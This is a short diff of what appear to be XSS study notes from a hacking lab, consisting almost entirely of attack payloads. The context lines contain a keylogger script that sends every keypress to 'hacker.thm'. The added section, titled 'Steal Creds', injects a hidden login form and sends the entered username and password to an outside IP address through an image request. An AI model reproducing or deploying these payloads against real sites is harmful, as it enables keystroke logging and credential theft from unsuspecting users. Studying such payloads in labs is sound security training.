@@ -5,3 +5,23 @@
 POC: <script>alert('EASY');</script>
 Key Logger : <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 ```
+
+
+Steal Creds:
+'''
+</body>
+<body onload='stealCreds();'>
+<div style="opacity:0;">
+  <form>
+    <input type="text" name="username" id="username" />
+    <input type="password" name="password" id="password" />
+  </form>
+  <script>
+    function stealCreds(){
+      var user = document.getElementById('username').value;
+      var pass = document.getElementById('password').value;
+      new Image().src="http://10.0.2.15/login?u=" + user + "&p=" + pass;
+    }
+  </script>
+</div>
+'''
